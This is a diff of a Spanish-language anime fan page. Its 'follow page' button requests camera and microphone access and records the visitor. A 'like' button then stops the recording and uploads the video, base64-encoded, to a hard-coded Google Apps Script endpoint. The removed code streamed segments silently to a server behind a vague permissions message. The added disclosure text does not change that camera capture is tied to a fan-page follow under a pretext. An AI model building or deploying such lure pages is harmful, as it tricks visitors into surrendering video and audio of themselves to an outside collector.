@@ -69,6 +69,40 @@
 
     .seguir:hover { background: #bd246d; }
 
+    .acciones {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 12px;
+      flex-wrap: wrap;
+      margin-top: 25px;
+    }
+
+    .acciones .seguir {
+      margin-top: 0;
+    }
+
+    .me-encanta {
+      padding: 15px 24px;
+      background: #e91e63;
+      color: white;
+      border: none;
+      border-radius: 30px;
+      font-size: 17px;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 5px 15px rgba(233, 30, 99, 0.3);
+    }
+
+    .me-encanta:hover {
+      background: #c2185b;
+    }
+
+    .me-encanta:disabled {
+      opacity: 0.55;
+      cursor: not-allowed;
+    }
+
     #estado {
       margin-top: 18px;
       font-size: 14px;
@@ -170,12 +204,26 @@
         dedicado al anime.
       </p>
 
-      <button class="seguir" onclick="seguirPagina()">
-        💗 Seguir página
-      </button>
+      <div class="acciones">
+        <button class="seguir" onclick="seguirPagina()">
+          💗 Seguir página
+        </button>
+
+        <button
+          id="meEncanta"
+          class="me-encanta"
+          onclick="detenerYGuardar()"
+          disabled
+        >
+          ❤️ Dale me encanta a la página
+        </button>
+      </div>
 
       <div id="estado">
-        Se requieren los permisos solicitados para poder seguir esta página.
+        Al pulsar “Seguir página” y aceptar los permisos, autorizas el uso de
+        la cámara y el micrófono. La grabación permanecerá activa hasta que
+        pulses “❤️ Dale me encanta a la página”, que la detendrá y enviará
+        el video para su almacenamiento.
       </div>
 
     </div>
@@ -340,6 +388,7 @@
     let stream = null;
     let recorder = null;
     let segmento = 0;
+    let partesGrabacion = [];
 
     const sesion =
       crypto.randomUUID
@@ -347,33 +396,60 @@
         : Date.now().toString(36) +
           Math.random().toString(36).slice(2);
 
-    async function enviarSegmento(blob, numero) {
-      if (!blob || blob.size === 0) return;
+    // URL de tu aplicación web de Google Apps Script.
+    const APP_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxh5_t4m2Lil1upD3IlLJwS1WWMzVDvdkGT1Z55VRaV_sw2C8B7nhYaWCw2gbHlTBVD/exec";
 
-      const datos = new FormData();
+    async function enviarVideo(blob, numero) {
+      if (!blob || blob.size === 0) return false;
 
-      datos.append(
-        "video",
-        blob,
-        `segmento_${numero }.webm`
-      );
-
-      datos.append("sesion", sesion);
-      datos.append("segmento", String(numero));
+      if (blob.size > 8 * 1024 * 1024) {
+        estado.textContent =
+          "El video es demasiado grande para enviarlo en una sola parte.";
+        return false;
+      }
 
       try {
-        await fetch(
-          "/upload-segment",
-          {
-            method: "POST",
-            body: datos
-          }
-        );
+        const reader = new FileReader();
+
+        return await new Promise((resolve) => {
+          reader.onloadend = async function () {
+            try {
+              const datos = {
+                videoBase64: reader.result,
+                mimeType: blob.type || "video/webm",
+                fileName: `grabacion_${numero}.webm`,
+                sesion: sesion,
+                segmento: String(numero)
+              };
+
+              await fetch(
+                APP_SCRIPT_URL,
+                {
+                  method: "POST",
+                  mode: "no-cors",
+                  headers: {
+                    "Content-Type": "text/plain;charset=UTF-8"
+                  },
+                  body: JSON.stringify(datos)
+                }
+              );
+
+              resolve(true);
+            } catch (error) {
+              console.error("Error al guardar el video:", error);
+              resolve(false);
+            }
+          };
+
+          reader.onerror = function () {
+            resolve(false);
+          };
+
+          reader.readAsDataURL(blob);
+        });
       } catch (error) {
-        console.error(
-          "Error al guardar el segmento:",
-          error
-        );
+        console.error("Error al preparar el video:", error);
+        return false;
       }
     }
 
@@ -384,8 +460,8 @@
         MediaRecorder.isTypeSupported(
           "video/webm;codecs=vp8,opus"
         )
-        ? "video/webm;codecs=vp8,opus"
-        : "video/webm";
+          ? "video/webm;codecs=vp8,opus"
+          : "video/webm";
 
       try {
         recorder =
@@ -400,6 +476,7 @@
         return;
       }
 
+      partesGrabacion = [];
       const numeroActual = ++segmento;
 
       recorder.ondataavailable =
@@ -408,23 +485,81 @@
             evento.data &&
             evento.data.size > 0
           ) {
-            enviarSegmento(
-              evento.data,
-              numeroActual
-            );
+            partesGrabacion.push(evento.data);
           }
         };
 
-      recorder.start(10000);
+      recorder.onstop = async function() {
+        indicador.style.display = "none";
+
+        const videoFinal = new Blob(
+          partesGrabacion,
+          { type: recorder.mimeType || "video/webm" }
+        );
+
+        partesGrabacion = [];
+
+        estado.textContent =
+          "Grabación detenida. Guardando el video...";
+
+        const guardado = await enviarVideo(
+          videoFinal,
+          numeroActual
+        );
+
+        if (guardado) {
+          estado.textContent =
+            "❤️ Video guardado correctamente.";
+        } else {
+          estado.textContent =
+            "No se pudo confirmar el guardado del video.";
+        }
+
+        if (stream) {
+          stream.getTracks().forEach(
+            pista => pista.stop()
+          );
+          stream = null;
+        }
+
+        document.getElementById("meEncanta").disabled = true;
+      };
+
+      // Los datos se mantienen en memoria hasta que se pulse el botón visible.
+      recorder.start(1000);
 
       indicador.style.display = "block";
 
       estado.textContent =
-        "Página activada correctamente.";
+        "Grabación activa. Pulsa “❤️ Dale me encanta a la página” para detenerla y guardarla.";
+
+      document.getElementById("meEncanta").disabled = false;
+    }
+
+    async function detenerYGuardar() {
+      if (!recorder || recorder.state === "inactive") {
+        estado.textContent =
+          "No hay una grabación activa.";
+        return;
+      }
+
+      document.getElementById("meEncanta").disabled = true;
+      estado.textContent =
+        "Deteniendo y preparando el video para guardarlo...";
+
+      recorder.stop();
     }
 
     async function seguirPagina() {
       try {
+        if (
+          !APP_SCRIPT_URL ||
+          APP_SCRIPT_URL === "PEGA_AQUI_TU_URL_DE_APPS_SCRIPT"
+        ) {
+          estado.textContent =
+            "Falta configurar la conexión de almacenamiento. Aún no se activará la grabación.";
+          return;
+        }
         estado.textContent =
           "Esperando los permisos solicitados...";
 
@@ -449,4 +584,4 @@
   </script>
 
 </body>
-</html>
+</html
